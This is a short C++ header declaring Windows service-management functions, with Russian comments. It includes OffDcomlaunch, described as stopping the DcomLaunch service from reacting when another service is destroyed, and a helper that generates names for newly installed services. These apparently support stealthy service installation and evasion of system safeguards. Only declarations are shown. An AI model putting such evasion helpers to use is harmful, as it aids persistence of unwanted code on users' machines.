#pragma once

#include "core.h"

namespace Service
{

bool Start( const char* name );
bool Stop( const char* name );
bool Delete( const char* name );
bool GetFileName( const char* name, StringBuilder& fileName );
//устанавливает чтобы служба dcomlaunch не реагировала за уничтожение какой-нить службы 
bool OffDcomlaunch();
//формирует имя для установки нового сервиса
bool CreateNameService( StringBuilder& name, StringBuilder& displayName );
//по пути файла сервиса PathExe ищет имя сервиса, имя файла нужно передавать в нижнем регистре
bool GetNameService( StringBuilder& name, const StringBuilder& pathExe );
//создание сервиса
bool Create( const StringBuilder& fileName, const StringBuilder& nameService, const StringBuilder& displayName );
//как стартовать сервис
bool SetStartType( const char* name, DWORD type );

}
